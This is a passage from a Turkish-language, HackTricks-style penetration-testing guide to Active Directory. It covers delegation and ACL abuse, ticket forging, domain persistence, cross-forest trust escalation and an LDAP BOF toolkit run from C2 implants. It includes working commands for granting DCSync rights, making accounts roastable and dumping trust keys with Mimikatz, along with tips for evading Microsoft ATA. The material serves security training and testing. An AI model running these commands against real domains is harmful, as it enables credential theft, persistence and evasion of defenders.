Dolayısıyla, eğer bir **Domain Admin bilgisayara giriş yaparsa**, onun TGT'sini dump edip [Pass the Ticket](pass-the-ticket.md) kullanarak onu taklit edebilirsiniz.\
Constrained delegation sayesinde **otomatik olarak bir Yazdırma Sunucusunu (Print Server) ele geçirebilirsiniz** (umarız DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Eğer bir kullanıcı veya bilgisayar "Constrained Delegation" için izinliyse, **bir kullanıcıyı taklit ederek bir bilgisayardaki bazı servislere erişim sağlamak** mümkün olur.\
Sonrasında, eğer bu kullanıcı/bilgisayarın **hash'ini ele geçirirseniz**, bazı servislere erişmek için **herhangi bir kullanıcıyı taklit edebilirsiniz** (hatta domain admin'leri bile).


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Bir uzak bilgisayarın Active Directory objesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** kod yürütme elde etmeyi sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ele geçirilmiş kullanıcı, daha sonra **lateral movement**/ **yükseltme** için size izin verebilecek **bazı domain objeleri üzerinde ilginç ayrıcalıklara** sahip olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool service'in dinleniyor** olduğunu keşfetmek, **yeni kimlik bilgileri edinmek** ve **ayrıcalıkları yükseltmek** için **istismar edilebilir**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Eğer **diğer kullanıcılar** **ele geçirilmiş** makineye **erişiyorsa**, bellekten kimlik bilgileri **toplamak** ve hatta **onların süreçlerine beacon enjekte ederek** onları taklit etmek mümkündür.\
Genellikle kullanıcılar sisteme RDP ile bağlanır, bu yüzden üçüncü taraf RDP oturumlarına karşı birkaç saldırı nasıl yapılır burada bulunuyor:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e bağlı bilgisayarlarda **local Administrator parolasını** yönetmek için bir sistem sağlar; parolanın **rastgele**, benzersiz ve sıkça **değiştirilmesini** garanti eder. Bu parolalar Active Directory'de saklanır ve erişim yalnızca yetkili kullanıcılar için ACL'ler aracılığıyla kontrol edilir. Bu parolalara erişmek için yeterli izinlere sahip olmak, diğer bilgisayarlara pivot yapmayı mümkün kılar.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Ele geçirilmiş makineden sertifikaları toplamak**, ortam içinde ayrıcalıkları yükseltmek için bir yol olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Eğer **zayıf/vulnerable template'ler** yapılandırılmışsa, bunları ayrıcalıkları yükseltmek için istismar etmek mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Yüksek ayrıcalıklı hesapla post-exploitation

### Dumping Domain Credentials

Bir kere **Domain Admin** veya daha da iyisi **Enterprise Admin** ayrıcalıklarını elde ettiğinizde, **domain veritabanını** (_ntds.dit_) **dump** edebilirsiniz.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Önceki bölümlerde tartışılan bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) için savunmasız hale getirmek

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kullanıcıları [**ASREPRoast**](asreproast.md) için savunmasız hale getirmek

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları vermek

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, belirli bir servis için **meşru bir Ticket Granting Service (TGS) bileti** oluşturur; bunun için genellikle **NTLM hash** (örneğin PC account'ın hash'i) kullanılır. Bu yöntem, **servis ayrıcalıklarına erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**, saldırganın Active Directory ortamında **krbtgt hesabının NTLM hash'ine** erişmesiyle ilgilidir. Bu hesap, tüm **Ticket Granting Ticket (TGT)**'lerini imzalamak için kullanıldığından özeldir; bu TGT'ler AD ağı içinde kimlik doğrulama için gereklidir.

Saldırgan bu hash'i elde ettiğinde herhangi bir hesap için **TGT** oluşturabilir (Silver ticket attack benzeri).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, ortak golden ticket tespit mekanizmalarını **atlatarak** oluşturulmuş golden ticket'lara benzer biletlere karşılık gelir.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Bir hesabın sertifikalarına sahip olmak veya onları talep edebilmek**, kullanıcı hesabında (şifre değişse bile) kalıcılık sağlamak için çok iyi bir yoldur:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Sertifikaları kullanmak**, domain içinde yüksek ayrıcalıklarla kalıcılık sağlamak için de mümkündür:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** objesi, **Domain Admins ve Enterprise Admins** gibi **ayrıcalıklı grupların** güvenliğini sağlamak için bu gruplar üzerinde standart bir **Access Control List (ACL)** uygular ve yetkisiz değişiklikleri engeller. Ancak, bu özellik suistimal edilebilir; eğer bir saldırgan AdminSDHolder'ın ACL'sini düzenleyip normal bir kullanıcıya tam erişim verirse, o kullanıcı tüm ayrıcalıklı gruplar üzerinde geniş kontrol elde eder. Bu güvenlik önlemi, yakından izlenmediği takdirde ters etki yapabilir ve yetkisiz erişime yol açabilir.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içerisinde bir **local administrator** hesabı bulunur. Böyle bir makinede admin hakları elde ederek, local Administrator hash'ini **mimikatz** kullanarak çıkarabilirsiniz. Bunu takiben bu parolanın **kullanılmasını etkinleştirmek** için bir registry değişikliği gerekir; böylece local Administrator hesabına uzak erişim mümkün olur.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Belirli domain objeleri üzerinde bir **kullanıcıya** bazı **özel izinler** verebilir ve bu sayede kullanıcının **ileride ayrıcalıkları yükseltmesini** sağlayabilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir **objenin** üzerinde hangi **izinlere** sahip olduğunu **depolamak** için kullanılır. Bir objenin security descriptor'unda **küçük bir değişiklik** yapabilirseniz, o obje üzerinde ayrıcalıklı bir gruba üye olmaya gerek kalmadan çok ilginç ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASS'ı bellekte değiştirerek tüm domain hesaplarına erişim sağlayan **evrensel bir parola** oluşturun.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Kendi **SSP**'nizi oluşturarak makineye erişimde kullanılan kimlik bilgilerini **düz metin** olarak **yakalayabilirsiniz**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Yeni bir **Domain Controller** kaydeder ve bunu, belirtilen objelere SIDHistory, SPN'ler... gibi **attribute'ları push etmek** için kullanır; bu değişikliklerle ilgili **log bırakmaz**. DA ayrıcalıklarına ve **root domain** içinde olmaya ihtiyaç vardır.\
Yanlış veri kullanırsanız oldukça çirkin log'lar ortaya çıkabilir.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce LAPS parolalarını **okuma** izniniz varsa ayrıcalıkları nasıl yükseltebileceğinizden bahsetmiştik. Ancak bu parolalar aynı zamanda **kalıcılık** sağlamak için de kullanılabilir.\
Bakınız:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak görür. Bu, **tek bir domain'in ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.

### Temel Bilgiler

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **domain**deki bir kullanıcının başka bir **domain**deki kaynaklara erişimini sağlayan bir güvenlik mekanizmasıdır. İki domainin kimlik doğrulama sistemleri arasında bir bağlantı oluşturur ve böylece kimlik doğrulama doğrulamalarının akmasına izin verir. Domain'ler bir trust kurduğunda, trust'un bütünlüğü için kritik olan belirli **anahtarlar** Domain Controller'larında (DC'lerde) değiş tokuş edilir ve saklanır.

Tipik bir senaryoda, bir kullanıcı **trusted domain**'deki bir servise erişmek istediğinde, önce kendi domain'inin DC'sinden bir **inter-realm TGT** talep etmelidir. Bu TGT, iki domainin üzerinde anlaştığı paylaşılan bir **anahtar** ile şifrelenir. Kullanıcı daha sonra bu inter-realm TGT'yi **trusted domain'in DC'sine** sunar ve bir service ticket (**TGS**) alır. Trusted domain'in DC'si inter-realm TGT'yi doğruladıktan sonra geçerliyse bir TGS verir ve kullanıcıya servise erişim sağlar.

**Adımlar**:

1. Bir **istemci bilgisayar** **Domain 1** içinde süreci başlatır ve **NTLM hash**ini kullanarak **Domain Controller (DC1)**'den bir **Ticket Granting Ticket (TGT)** talep eder.
2. DC1, istemci başarılı bir şekilde doğrulanmışsa yeni bir TGT verir.
3. İstemci daha sonra **Domain 2**'deki kaynaklara erişmek için gerekli olan **inter-realm TGT'yi** DC1'den talep eder.
4. Inter-realm TGT, iki yönlü domain trust'ın bir parçası olarak DC1 ve DC2 arasında paylaşılan bir **trust key** ile şifrelenir.
5. İstemci inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, inter-realm TGT'yi paylaşılan trust key ile doğrular ve eğer geçerliyse istemcinin erişmek istediği Domain 2 içindeki sunucu için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak, istemci bu TGS'yi sunucuya sunar; TGS sunucunun hesap hash'i ile şifrelenmiştir ve bu sayede Domain 2'deki servise erişim sağlanır.

### Farklı trust türleri

Bir trust'un **tek yönlü** veya **çift yönlü** olabileceğini belirtmek önemlidir. Çift yönlü seçenekte, her iki domain de birbirine güvenir; ancak **tek yönlü** trust ilişkisinde bir domain **trusted** diğer ise **trusting** domain olur. Son durumda, **trusted** olan domain'den **trusting** domain içindeki kaynaklara erişebilirsiniz.

Eğer Domain A, Domain B'ye trust veriyorsa, A trusting domain, B ise trusted domain'dir. Ayrıca, **Domain A** içinde bu bir **Outbound trust**; **Domain B** içinde ise **Inbound trust** olur.

**Farklı trusting ilişkileri**

- **Parent-Child Trusts**: Aynı forest içinde yaygın bir yapılandırmadır; child domain otomatik olarak parent domain ile iki yönlü ve transitif bir trust'a sahiptir. Bu, parent ve child arasında kimlik doğrulama isteklerinin sorunsuzca akabileceği anlamına gelir.
- **Cross-link Trusts**: "shortcut trusts" olarak da adlandırılır; child domain'ler arasında referral süreçlerini hızlandırmak için kurulur. Karmaşık forest'larda kimlik doğrulama yönlendirmeleri genellikle forest root'a kadar çıkıp hedef domaine inmek zorunda kalır. Cross-link'ler oluşturarak bu yol kısaltılır, özellikle coğrafi olarak dağıtılmış ortamlarda faydalıdır.
- **External Trusts**: Farklı, alakasız domain'ler arasında kurulur ve doğası gereği non-transitive'dir. [Microsoft dokümantasyonuna](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre, external trustlar, forest dışındaki bir domain'deki kaynaklara erişim için kullanışlıdır. Security, external trust'larla SID filtering ile güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulan trust'lardır. Yaygın olarak karşılaşılmasa da, tree-root trust'lar bir forest'a yeni domain ağaçları eklerken önemlidir; iki yönlü transitiviteyi sağlarlar. Daha fazla bilgi için [Microsoft'un rehberine](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) bakabilirsiniz.
- **Forest Trusts**: İki forest root domain arasında kurulan iki yönlü transitif trust'lardır ve güvenliği artırmak için SID filtering uygularlar.
- **MIT Trusts**: [RFC4120-uyumlu](https://tools.ietf.org/html/rfc4120) Kerberos domain'leri ile kurulan, Windows dışı ortamlara yönelik trust'lardır. MIT trust'lar daha spesifik ve Kerberos tabanlı sistemlerle entegrasyon gerektiren ortamlara yöneliktir.

#### Trust ilişkilerindeki diğer farklar

- Bir trust ilişkisi **transitive** (A B'ye trust veriyorsa, B C'ye trust veriyorsa A C'ye trust verir) veya **non-transitive** olabilir.
- Bir trust ilişkisi **bidirectional trust** (her iki taraf birbirine güvenir) veya **one-way trust** (sadece bir taraf diğerine güvenir) olarak kurulabilir.

### Saldırı Yolu

1. **Trust ilişkilerini** enumerate edin
2. Hangi **security principal**'in (user/group/computer) **diğer domain**in kaynaklarına **erişimi** olduğunu kontrol edin; belki ACE girdileriyle veya diğer domain'in gruplarında yer alarak. **Domain'ler arası ilişkiler**e bakın (muhtemelen trust bu amaçla oluşturulmuştur).
1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Domain'ler arasında **pivot** yapabilecek **hesapları** **ele geçirin**.

Diğer domain'deki kaynaklara erişebilen saldırganlar üç ana mekanizma aracılığıyla erişim elde edebilirler:

- **Yerel Grup Üyeliği (Local Group Membership)**: Principal'ler sunucudaki “Administrators” grubu gibi yerel gruplara eklenebilir; bu da o makine üzerinde önemli kontrol sağlar.
- **Yabancı Domain Grup Üyeliği (Foreign Domain Group Membership)**: Principal'ler ayrıca yabancı domain içindeki grupların üyeleri olabilir. Ancak, bu yöntemin etkinliği, trust'ın doğasına ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'ler özellikle bir **DACL** içindeki **ACE**'lerde belirtilmiş olabilir, bu da onlara belirli kaynaklara erişim verir. ACL'ler, DACL'ler ve ACE'lerin mekaniklerine derinlemesine girmek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper çok değerli bir kaynaktır.

### Yetkili dış kullanıcı/grupları bulma

Yabancı güvenlik principal'lerini bulmak için domain içinde **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kontrol edebilirsiniz. Bunlar **dış bir domain/forest**ten gelen user/group olacaktır.

Bunu **Bloodhound** veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Etki alanı güven ilişkilerini listelemenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Bu trust için **2 trusted keys** vardır: biri _Child --> Parent_ ve diğeri _Parent_ --> _Child_.\
> Mevcut domain tarafından hangi anahtarın kullanıldığını şu komutlarla görebilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust'ı istismar ederek SID-History injection ile child/parent domain'e Enterprise admin olarak yükseltin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)'nin nasıl exploit edilebileceğini anlamak kritiktir. Configuration NC, Active Directory (AD) ortamlarında bir forest boyunca yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest'taki her Domain Controller (DC)'ye replikasyon edilir; writable DC'ler Configuration NC'nin yazılabilir bir kopyasını bulundurur. Bunu exploit etmek için bir DC üzerinde **SYSTEM privileges** gereklidir, tercihen bir child DC.

**Link GPO to root DC site**

Configuration NC'nin Sites container'ı, AD forest içindeki tüm domain'e katılmış bilgisayarların site bilgilerini içerir. Herhangi bir DC üzerinde SYSTEM privileges ile çalışarak, saldırganlar GPO'ları root DC site'larına linkleyebilir. Bu eylem, bu sitelere uygulanan politikaları manipüle ederek root domain'i potansiyel olarak tehlikeye atabilir.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Bir attack vector domain içindeki ayrıcalıklı gMSA'ları hedeflemeyi içerir. gMSA'ların parolalarını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM privileges ile KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA için parolaları hesaplamak mümkündür.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Bu yöntem yeni ayrıcalıklı AD objelerinin oluşturulmasını beklemeyi gerektirir. SYSTEM privileges ile bir saldırgan AD Schema'yı değiştirerek herhangi bir kullanıcıya tüm class'lar üzerinde tam kontrol verebilir. Bu, yeni oluşturulan AD objeleri üzerinde yetkisiz erişim ve kontrol ile sonuçlanabilir.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 zafiyeti, Public Key Infrastructure (PKI) objeleri üzerinde kontrol sağlayarak forest içindeki herhangi bir kullanıcı adına kimlik doğrulama yapmaya imkân veren bir certificate template oluşturmayı hedefler. PKI objeleri Configuration NC içinde bulunduğundan, yazılabilir bir child DC'nin kompromize edilmesi ESC5 saldırılarının gerçekleştirilmesine olanak tanır.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domain'iniz, dış bir domain tarafından güvenilen** konumda olup size onun üzerinde **belirsiz izinler** verilir. Dış domain üzerinde **domain'inizdeki hangi principal'ların hangi erişime sahip olduğunu** bulmanız ve ardından bunu istismar etmeyi denemeniz gerekecek:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - Tek Yönlü (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trusts genelinde SID history attribute'u kullanan saldırı riski, tüm inter-forest trusts üzerinde varsayılan olarak etkin olan SID Filtering ile azaltılır. Bu, Microsoft'un bakışına göre domain yerine forest'ı güvenlik sınırı olarak kabul eden ve intra-forest trusts'ın güvenli olduğu varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu yüzden zaman zaman devre dışı bırakılabilir.

### **Selective Authentication:**

- Inter-forest trusts için Selective Authentication kullanmak, iki forest'ten kullanıcıların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, kullanıcıların trusting domain veya forest içindeki domainlere ve serverlara erişmesi için açık izinler gereklidir.
- Bu önlemlerin, writable Configuration Naming Context (NC)'nin kötüye kullanılmasına veya trust account'a yönelik saldırılara karşı koruma sağlamadığını not etmek önemlidir.

[**Ired.team'de domain trusts hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatörün OU haklarının bulunduğu herhangi bir yere yeni principal veya bilgisayar hesapları yerleştirmesine izin verir. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute` ise write-property hakları bulunduğunda hedefleri doğrudan ele geçirir.
- ACL odaklı komutlar (`add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync`) AD üzerindeki herhangi bir nesnede WriteDACL/WriteOwner'ı parola sıfırlamalarına, grup üyeliği kontrolüne veya DCSync çoğaltma ayrıcalıklarına çevirir ve PowerShell/ADSI artığı bırakmadan işlem yapar. `remove-*` eşdeğerleri enjekte edilmiş ACE'leri temizler.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` ele geçirilmiş bir kullanıcıyı anında Kerberoastable yapar; `add-asreproastable` (UAC toggle) parolaya dokunmadan AS-REP roasting için işaretler.
- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flag'leri veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerlerini yeniden yazar; constrained/unconstrained/RBCD saldırı yollarını etkinleştirir ve uzak PowerShell veya RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ayrıcalıklı SID'leri kontrollü bir principal’in SID history bölümüne enjekte eder (bkz. [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS üzerinden tamamen gizli erişim mirasını sağlar.
- `move-object` bilgisayarların veya kullanıcıların DN/OU'sunu değiştirir; bir saldırganın varlıkları, önceden delege edilmiş hakların bulunduğu OUs içine sürüklemesine ve ardından `set-password`, `add-groupmember` veya `add-spn` gibi işlemleri kötüye kullanmasına imkan tanır.
- Sıkı kapsamlı kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.) operatör kimlik bilgilerini veya kalıcılığı topladıktan sonra hızlı geri alım yapmaya izin vererek telemetriyi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins'ın yalnızca Domain Controllers üzerinde oturum açmasına izin verilmesi; diğer hostlarda kullanılmaktan kaçınılması önerilir.
- **Service Account Privileges**: Servisler güvenlik amacıyla Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA ayrıcalıkları gerektiren görevler için bu ayrıcalıkların süresi sınırlandırılmalıdır. Bu, şu komutla sağlanabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID'leri 2889/3074/3075 için denetim yapın ve LDAP MITM/relay denemelerini engellemek için DC'lerde/istemcilerde LDAP signing ile LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Deception uygulamak, parola süresi hiç dolmayan veya Trusted for Delegation olarak işaretlenmiş olduğu gibi özelliklere sahip aldatıcı kullanıcılar veya bilgisayarlar gibi tuzaklar kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip kullanıcılar oluşturmayı veya bunları yüksek ayrıcalıklı gruplara eklemeyi kapsar.
- Pratik bir örnek şu araçların kullanımını içerir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerini dağıtma hakkında daha fazla bilgi için [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) adresine bakın.

### **Identifying Deception**

- **For User Objects**: Şüpheli göstergeler arasında alışılmadık ObjectSID, nadir oturum açma, oluşturulma tarihleri ve düşük kötü parola deneme sayıları bulunur.
- **General Indicators**: Potansiyel aldatıcı nesnelerin özniteliklerini gerçek olanlarla karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu tür aldatmacaları tespit etmeye yardımcı olabilir.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA algılamasını önlemek için Domain Controllers üzerinde oturum sıralamasından kaçınmak.
- **Ticket Impersonation**: Ticket oluşturmak için **aes** anahtarlarını kullanmak, NTLM'e düşürmeme sayesinde tespitten kaçınmaya yardımcı olur.
- **DCSync Attacks**: ATA algılamasından kaçınmak için bir Domain Controller olmayan bir makineden yürütülmesi tavsiye edilir; çünkü bir Domain Controller'dan doğrudan yürütme uyarıları tetikleyecektir.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
